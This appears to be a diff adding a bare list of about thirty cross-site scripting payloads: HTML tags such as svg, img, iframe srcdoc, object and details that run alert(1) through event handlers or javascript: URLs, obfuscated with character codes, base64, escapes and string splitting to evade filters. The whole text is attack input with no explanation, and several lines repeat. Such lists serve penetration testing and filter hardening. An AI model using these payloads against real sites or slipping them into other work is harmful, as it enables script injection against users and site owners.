@@ -1,0 +1,31 @@
+```html
+<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>
+<img src=x onerror=window['\\u0061lert'](1)>
+<iframe srcdoc="<svg onload=window['\\x61lert'](1)>"></iframe>
+<object data="javascript:window['al'+'ert'](1)"></object>
+<details open ontoggle=window['\\u0061lert'](1)>
+<iframe srcdoc="<img src=x onerror=atob('YWxlcnQoMSk=')>"></iframe>
+<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<svg onload=window['al'+'ert'](1)>
+<object data="javascript:eval(atob('YWxlcnQoMSk='))"></object>
+<iframe srcdoc="<svg onload=atob('YWxlcnQoMSk=')>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<img src=x onerror=window['\\x61lert'](1)>"></iframe>
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4="></object>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:window['al'+'ert'](1)">
+<marquee onstart=window['\\u0061lert'](1)></marquee>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>
+<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<object data="javascript:eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))"></object>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=window['al'+'ert'](1)>
+<object data="javascript:window['\\u0061lert'](1)"></object>
+```
